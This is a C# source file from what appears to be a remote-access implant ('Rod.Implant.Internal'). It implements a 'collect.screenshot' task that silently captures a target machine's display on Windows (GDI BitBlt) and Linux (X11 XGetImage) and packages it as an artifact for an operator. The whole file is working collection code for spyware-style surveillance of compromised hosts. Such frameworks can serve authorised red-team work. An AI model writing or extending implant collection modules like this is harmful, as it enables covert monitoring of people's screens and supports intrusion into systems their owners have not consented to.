using System.Runtime.InteropServices;
using System.Runtime.Versioning;

namespace Rod.Implant.Internal;

// The desktop-capture half of collect.screenshot (architecture.md Sec 10.1
// collect, Sec 11 artifacts): reads the target's display into an RGBA buffer
// over the standard desktop-capture APIs -- GDI's BitBlt on Windows, the X11
// core protocol's XGetImage on Linux. No third-party capture or image
// library: both APIs return raw pixels, and Png.EncodeRgba turns them into
// the artifact. A host with no display to read (a headless server, an
// unavailable X server, a machine without libX11) refuses cleanly with the
// cause, so the operator sees why rather than an empty frame.

/// <summary>One captured frame: its size and RGBA pixels, row-major.</summary>
internal sealed record CapturedScreen(int Width, int Height, byte[] Rgba);

internal static class ScreenCapture
{
    /// <summary>
    /// Captures the primary display. Windows reads the screen through GDI;
    /// everything else reads the X11 root window (an unavailable X library or
    /// display throws, which the verb reports as the task's cause).
    /// </summary>
    public static CapturedScreen Capture()
        => OperatingSystem.IsWindows() ? Gdi.Capture() : X11.Capture();

    // The Windows capture: GetDC(null) borrows the screen DC, BitBlt copies
    // it into a compatible bitmap (SRCCOPY | CAPTUREBLT so layered windows
    // join the frame), and GetDIBits reads the pixels as top-down 32-bpp
    // BGRA -- the documented GDI screenshot path every Win32 reference shows.
    [SupportedOSPlatform("windows")]
    private static class Gdi
    {
        private const int SmCxScreen = 0;
        private const int SmCyScreen = 1;
        private const uint SrcCopy = 0x00CC0020;
        private const uint CaptureBlt = 0x40000000;
        private const uint DibRgbColors = 0;

        public static CapturedScreen Capture()
        {
            var screen = GetDC(IntPtr.Zero);
            if (screen == IntPtr.Zero)
                throw new InvalidOperationException("GetDC returned no screen device context");

            try
            {
                var width = GetSystemMetrics(SmCxScreen);
                var height = GetSystemMetrics(SmCyScreen);
                if (width <= 0 || height <= 0)
                    throw new InvalidOperationException($"screen metrics reported {width}x{height}");

                var memory = CreateCompatibleDC(screen);
                var bitmap = CreateCompatibleBitmap(screen, width, height);
                try
                {
                    var prior = SelectObject(memory, bitmap);
                    try
                    {
                        if (!BitBlt(memory, 0, 0, width, height, screen, 0, 0, SrcCopy | CaptureBlt))
                            throw new InvalidOperationException(
                                $"BitBlt failed (Win32 error {Marshal.GetLastWin32Error()})");

                        // Negative height asks GetDIBits for a top-down image,
                        // so the first row in the buffer is the top of the
                        // screen.
                        var info = new BitmapInfoHeader
                        {
                            Size = (uint)Marshal.SizeOf<BitmapInfoHeader>(),
                            Width = width,
                            Height = -height,
                            Planes = 1,
                            BitCount = 32,
                        };
                        var pixels = new byte[checked(width * height * 4)];
                        var pinned = GCHandle.Alloc(pixels, GCHandleType.Pinned);
                        try
                        {
                            if (GetDIBits(memory, bitmap, 0, (uint)height, pinned.AddrOfPinnedObject(),
                                    ref info, DibRgbColors) == 0)
                                throw new InvalidOperationException(
                                    $"GetDIBits failed (Win32 error {Marshal.GetLastWin32Error()})");
                        }
                        finally
                        {
                            pinned.Free();
                        }

                        SwapRedBlue(pixels);
                        return new CapturedScreen(width, height, pixels);
                    }
                    finally
                    {
                        SelectObject(memory, prior);
                    }
                }
                finally
                {
                    DeleteObject(bitmap);
                    DeleteDC(memory);
                }
            }
            finally
            {
                ReleaseDC(IntPtr.Zero, screen);
            }
        }

        // GDI hands back BGRA; the encoder wants RGBA.
        private static void SwapRedBlue(Span<byte> pixels)
        {
            for (var at = 0; at < pixels.Length; at += 4)
                (pixels[at], pixels[at + 2]) = (pixels[at + 2], pixels[at]);
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct BitmapInfoHeader
        {
            public uint Size;
            public int Width;
            public int Height;
            public ushort Planes;
            public ushort BitCount;
            public uint Compression;
            public uint SizeImage;
            public int XPelsPerMeter;
            public int YPelsPerMeter;
            public uint ClrUsed;
            public uint ClrImportant;
        }

        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr window);

        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr window, IntPtr dc);

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int index);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr dc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr dc, int width, int height);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr dc, IntPtr obj);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(
            IntPtr destination, int destX, int destY, int width, int height,
            IntPtr source, int sourceX, int sourceY, uint rop);

        [DllImport("gdi32.dll")]
        private static extern int GetDIBits(
            IntPtr dc, IntPtr bitmap, uint startScan, uint scanLines,
            IntPtr bits, ref BitmapInfoHeader info, uint usage);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteObject(IntPtr obj);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteDC(IntPtr dc);
    }

    // The X11 capture: XGetImage on the root window in ZPixmap format, the
    // screen read every Xlib reference documents. The returned XImage carries
    // its own byte order, masks, and stride, so the conversion reads the
    // server's layout rather than assuming one; the X server has no alpha, so
    // the encoder's alpha channel is opaque. A display-less host fails at
    // XOpenDisplay and the verb reports the cause.
    private static class X11
    {
        private const int ZPixmap = 2;
        private const ulong AllPlanes = 0xFFFFFFFF;

        public static CapturedScreen Capture()
        {
            var display = XOpenDisplay(null);
            if (display == IntPtr.Zero)
                throw new InvalidOperationException(
                    "no X display is available (DISPLAY is unset, the server refused the connection, or the session is headless)");

            try
            {
                var root = XDefaultRootWindow(display);
                var screen = XDefaultScreen(display);
                var width = XDisplayWidth(display, screen);
                var height = XDisplayHeight(display, screen);
                if (width <= 0 || height <= 0)
                    throw new InvalidOperationException($"the X server reported {width}x{height}");

                var imagePtr = XGetImage(display, root, 0, 0, (uint)width, (uint)height, AllPlanes, ZPixmap);
                if (imagePtr == IntPtr.Zero)
                    throw new InvalidOperationException("XGetImage failed");

                try
                {
                    var image = Marshal.PtrToStructure<XImage>(imagePtr);
                    var source = new byte[(long)image.BytesPerLine * height];
                    Marshal.Copy(image.Data, source, 0, source.Length);
                    return Convert(source, width, height, image);
                }
                finally
                {
                    DestroyImage(imagePtr);
                }
            }
            finally
            {
                XCloseDisplay(display);
            }
        }

        // Re packs one server-layout ZPixmap into RGBA. The masks say where
        // each channel lives inside a pixel, so the same path serves the
        // 24- and 32-bit depths and the either-way byte orders X allows.
        private static CapturedScreen Convert(byte[] source, int width, int height, XImage image)
        {
            var bytesPerPixel = (image.BitsPerPixel + 7) / 8;
            var rgba = new byte[width * height * 4];
            var redShift = MaskShift(image.RedMask);
            var greenShift = MaskShift(image.GreenMask);
            var blueShift = MaskShift(image.BlueMask);

            for (var y = 0; y < height; y++)
            {
                var row = (long)y * image.BytesPerLine;
                for (var x = 0; x < width; x++)
                {
                    var at = row + (long)x * bytesPerPixel;
                    uint pixel = 0;
                    if (image.ByteOrder == 0) // LSBFirst
                    {
                        for (var b = bytesPerPixel - 1; b >= 0; b--)
                            pixel = (pixel << 8) | source[at + b];
                    }
                    else // MSBFirst
                    {
                        for (var b = 0; b < bytesPerPixel; b++)
                            pixel = (pixel << 8) | source[at + b];
                    }

                    var to = (y * width + x) * 4;
                    rgba[to] = Channel(pixel, image.RedMask, redShift);
                    rgba[to + 1] = Channel(pixel, image.GreenMask, greenShift);
                    rgba[to + 2] = Channel(pixel, image.BlueMask, blueShift);
                    rgba[to + 3] = 255;
                }
            }
            return new CapturedScreen(width, height, rgba);
        }

        private static int MaskShift(ulong mask)
        {
            var shift = 0;
            while ((mask & 1) == 0 && shift < 64)
            {
                mask >>= 1;
                shift++;
            }
            return shift;
        }

        private static byte Channel(uint pixel, ulong mask, int shift)
            => mask == 0 ? (byte)0 : (byte)((pixel & mask) >> shift);

        // Frees the XImage through its own destroy_image function: XDestroyImage
        // is a macro in Xlib, so the callable lives inside the struct. The
        // struct is freed by that call -- nothing else releases it.
        private static void DestroyImage(IntPtr imagePtr)
        {
            var offset = Marshal.OffsetOf<XImage>(nameof(XImage.DestroyImage));
            var destroy = Marshal.ReadIntPtr(imagePtr, (int)offset);
            if (destroy != IntPtr.Zero)
                Marshal.GetDelegateForFunctionPointer<DestroyImageDelegate>(destroy)(imagePtr);
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int DestroyImageDelegate(IntPtr image);

        // Xlib's XImage, field order per Xlib.h. LayoutKind.Sequential with
        // pointer-sized fields mirrors the C layout on LP64 Linux.
        [StructLayout(LayoutKind.Sequential)]
        private struct XImage
        {
            public int Width;
            public int Height;
            public int XOffset;
            public int Format;
            public IntPtr Data;
            public int ByteOrder;
            public int BitmapUnit;
            public int BitmapBitOrder;
            public int Depth;
            public int BytesPerLine;
            public int BitsPerPixel;
            public ulong RedMask;
            public ulong GreenMask;
            public ulong BlueMask;
            public IntPtr ObsoleteData;
            public IntPtr CreateImage;
            public IntPtr DestroyImage;
            public IntPtr GetPixel;
            public IntPtr PutPixel;
            public IntPtr SubImage;
        }

        [DllImport("libX11.so.6")]
        private static extern IntPtr XOpenDisplay(string? name);

        [DllImport("libX11.so.6")]
        private static extern int XCloseDisplay(IntPtr display);

        [DllImport("libX11.so.6")]
        private static extern ulong XDefaultRootWindow(IntPtr display);

        [DllImport("libX11.so.6")]
        private static extern int XDefaultScreen(IntPtr display);

        [DllImport("libX11.so.6")]
        private static extern int XDisplayWidth(IntPtr display, int screen);

        [DllImport("libX11.so.6")]
        private static extern int XDisplayHeight(IntPtr display, int screen);

        [DllImport("libX11.so.6")]
        private static extern IntPtr XGetImage(
            IntPtr display, ulong drawable, int x, int y,
            uint width, uint height, ulong planeMask, int format);
    }
}
